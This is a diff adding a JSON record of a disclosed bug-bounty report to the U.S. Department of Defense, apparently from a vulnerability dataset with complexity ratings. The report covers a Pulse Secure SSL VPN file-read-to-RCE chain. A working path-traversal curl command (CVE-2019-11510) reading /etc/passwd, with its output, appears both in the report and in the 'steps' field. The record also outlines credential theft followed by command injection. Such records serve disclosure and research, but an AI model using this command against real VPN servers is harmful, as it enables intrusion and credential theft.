@@ -1,0 +1,46 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "sp1d3rs ",
+  "title": "Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://\u2588\u2588\u2588\u2588\u2588\u2588 (\u2588\u2588\u2588)",
+  "content": "\nDescription\nHello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:\nCVE-2019-11510 - Pre-auth Arbitrary File Reading\nCVE-2019-11542 - Post-auth Stack Buffer Overflow\nCVE-2019-11539 - Post-auth Command Injection\nCVE-2019-11538 - Post-auth Arbitrary File Reading\nCVE-2019-11508 - Post-auth Arbitrary File Writing\nCVE-2019-11540 - Post-auth Session Hijacking\nLink to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf\nI discovered that https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 instance is vulnerable to described vulnerabilities.\nPOC\nReading /etc/passwd via CVE-2019-11510:\nCode 132 Bytes\n1curl -i -k --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/\nCode 234 Bytes\n1root:x:0:0:root:/:/bin/bash\n2nfast:x:0:0:nfast:/:/bin/bash\n3bin:x:1:1:bin:/:\n4nobody:x:99:99:Nobody:/:\n5dns:x:98:98:DNS:/:\n6term:x:97:97:Telnet/SSH:/:\n7web80:x:96:96:Port 80 web:/:\n8rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\n\u2588\u2588\u2588\u2588\u2588\nThe RCE can be achieved with this chain:\n1) Pulse Secure stores credentials in the cleartext.\n2) Attacker reads credentials and authorizes on VPN\n3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.\nSuggested fix\nUpdate the Pulse Secure SSL VPN software.\nNote\nIf you experience timeout errors when reproducing, try to change your IP/VPN\nImpact\nRemote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.\nYou can see here example report to Twitter by Orange Tsai: https://hackerone.com/reports/591295\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1718744820,
+  "report_url": "https://hackerone.com/reports/696276",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "curl -i -k --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+    ],
+    [
+      2,
+      "Extract plaintext credentials from the VPN configuration files accessed via the arbitrary file read vulnerability"
+    ],
+    [
+      3,
+      "Use the obtained credentials to authenticate to the VPN"
+    ],
+    [
+      4,
+      "Exploit the post-auth command injection vulnerability (CVE-2019-11539) to execute arbitrary commands as root"
+    ]
+  ],
+  "vuln_description": "This vulnerability chain in Pulse Secure SSL VPN involves first exploiting an arbitrary file read vulnerability (CVE-2019-11510) to access sensitive files including credentials stored in plaintext. With these credentials, an attacker can authenticate to the VPN and then exploit a post-authentication command injection vulnerability (CVE-2019-11539) to achieve remote code execution as root.",
+  "reason": "While the vulnerability chain involves multiple steps (file read, credential extraction, authentication, and command injection), each component is relatively straightforward once the initial vulnerability is discovered. The attack does not require maintaining complex application states or understanding subtle interactions between components. The file read vulnerability follows a common path traversal pattern, and the command injection is a standard vulnerability type.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": "591295"
+}
